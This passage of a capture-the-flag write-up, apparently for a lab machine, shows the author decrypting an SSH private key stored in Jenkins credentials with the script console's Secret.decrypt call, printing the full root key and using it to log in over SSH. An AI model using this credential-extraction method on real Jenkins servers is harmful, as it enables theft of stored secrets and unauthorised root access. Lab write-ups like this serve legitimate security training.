==> We can use them to login to the `Jenkins`instance!!

Upon going to the credentials and selecting the existing one, when inspecting the HTML code we see this:

```html
<input name="_.privateKey" type="hidden" value="{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}">
```

We can then try to decrypt this key using the built-in function of `Jenkins`:

```bash
println(hudson.util.Secret.decrypt("{AQAAABAAAAowLr...IMMaKSM=}"))

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

and we get the private root key!!

We can then use it to log in and get the root flag::

```bash
ssh -i id_rsa root@10.129.230.220
```